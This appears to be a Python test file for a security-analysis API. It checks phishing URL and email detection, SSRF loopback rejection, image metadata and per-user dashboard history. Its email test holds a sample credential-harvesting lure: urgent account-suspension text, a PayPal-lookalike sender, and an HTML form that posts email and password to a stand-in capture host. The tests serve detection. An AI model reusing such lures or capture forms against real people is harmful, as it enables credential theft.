"""Tests de analisis: URL phishing, red SSRF, email, media, dashboard."""
import io
import json

import pytest

from conftest import API_PREFIX

PHISHY_URL = "http://paypal-secure-login-verify-nonexistent-12345.tk/account/login"


class _FakeNetworkAnalyzer:
    """Avoid real network calls from the dashboard network-status probe."""

    async def check_network_integrity(self, target):
        return {"score": 0, "findings": []}


@pytest.fixture()
def fast_network(monkeypatch):
    from app.services.orchestrator import orchestrator

    monkeypatch.setattr(orchestrator, "_network_analyzer", _FakeNetworkAnalyzer())


def test_analyze_phishy_url_returns_findings_and_score(auth_client):
    client, user = auth_client
    resp = client.post(
        f"{API_PREFIX}/analyze/url",
        json={"url": PHISHY_URL},
        headers=user["headers"],
    )
    assert resp.status_code == 200, resp.text
    data = resp.json()
    assert len(data["findings"]) > 0
    assert data["risk_score"]["total"] > 0


def test_analyze_network_rejects_loopback(auth_client):
    client, user = auth_client
    resp = client.post(
        f"{API_PREFIX}/analyze/network",
        json={"target_ip": "127.0.0.1"},
        headers=user["headers"],
    )
    assert resp.status_code == 400


def test_analyze_email_credential_harvesting_high_risk(auth_client):
    client, user = auth_client
    body = """
    Dear customer, this is an official notice from the security team.
    Your account has been suspended. Verify your account now to avoid
    permanent deactivation. Unauthorized access was detected.
    This password will expire within 24 hours. Act now immediately.
    Final warning: confirm your password or your account will be terminated.
    <form method="post" action="http://evil-example-12345.tk/capture">
      <input type="text" name="email" />
      <input type="password" name="password" autocomplete="off" />
    </form>
    """
    resp = client.post(
        f"{API_PREFIX}/analyze/email",
        json={
            "subject": "URGENT: verify your account immediately",
            "sender": "security@paypal.account.verify.update.secure-login-nonexistent-12345.tk",
            "body": body,
        },
        headers=user["headers"],
    )
    assert resp.status_code == 200, resp.text
    data = resp.json()
    assert len(data["findings"]) > 0
    # Nota: el risk engine pondera contenido en 0.25, por lo que el score
    # final del endpoint de email se encuentra tipicamente en rango medio.
    assert data["risk_score"]["total"] >= 25
    assert data["risk_score"]["level"] in ("medium", "high", "critical")


def test_analyze_media_with_pillow_png(auth_client, tmp_path):
    from PIL import Image

    client, user = auth_client
    png_path = tmp_path / "test.png"
    Image.new("RGB", (64, 64), color=(120, 30, 200)).save(png_path, format="PNG")

    resp = client.post(
        f"{API_PREFIX}/analyze/media",
        files={"file": ("test.png", png_path.read_bytes(), "image/png")},
        headers=user["headers"],
    )
    assert resp.status_code == 200, resp.text
    data = resp.json()
    assert data["metadata"]["format"] == "PNG"
    assert data["risk_score"]["total"] >= 0


def test_dashboard_stats_are_per_user_and_persisted(auth_client, fast_network):
    client, user_a = auth_client

    # Otro usuario registrado en el mismo proceso/servidor
    from conftest import make_user

    user_b = make_user(client)

    for _ in range(2):
        resp = client.post(
            f"{API_PREFIX}/analyze/url",
            json={"url": PHISHY_URL},
            headers=user_a["headers"],
        )
        assert resp.status_code == 200

    # Usuario A ve solo sus 2 analisis
    resp = client.get(f"{API_PREFIX}/dashboard/stats", headers=user_a["headers"])
    assert resp.status_code == 200
    stats_a = resp.json()
    assert stats_a["total_scans"] == 2
    assert sum(stats_a["risk_distribution"].values()) == 2
    assert 0 <= stats_a["threats_detected"] <= stats_a["total_scans"]
    assert len(stats_a["recent_analyses"]) == 2
    assert set(stats_a["risk_distribution"]) == {"low", "medium", "high", "critical"}
    entry = stats_a["recent_analyses"][0]
    for key in ("id", "analysis_type", "target", "timestamp", "risk_score"):
        assert key in entry

    # Usuario B no ve nada de A
    resp = client.get(f"{API_PREFIX}/dashboard/stats", headers=user_b["headers"])
    assert resp.status_code == 200
    stats_b = resp.json()
    assert stats_b["total_scans"] == 0
    assert stats_b["recent_analyses"] == []

    # Persistencia: el historial se escribio en el DATA_DIR del test
    from app.core import history_store

    persisted = json.loads(history_store.HISTORY_FILE.read_text(encoding="utf-8"))
    assert user_a["username"] not in persisted  # la clave es el id de usuario
    assert user_a["access"]  # tokens existen
    # entries keyed by user id
    from app.core.auth import get_user

    user_a_id = get_user(user_a["username"]).id
    assert len(persisted.get(user_a_id, [])) == 2


def test_dashboard_stats_anonymous_sees_empty(auth_client, fast_network):
    client, _user = auth_client
    # REQUIRE_AUTH_FOR_ANALYSIS=false => el endpoint responde, pero sin auth
    # no se graba historial y el dashboard sale vacio.
    resp = client.get(f"{API_PREFIX}/dashboard/stats")
    assert resp.status_code == 200
    stats = resp.json()
    assert stats["total_scans"] == 0
    assert stats["recent_analyses"] == []
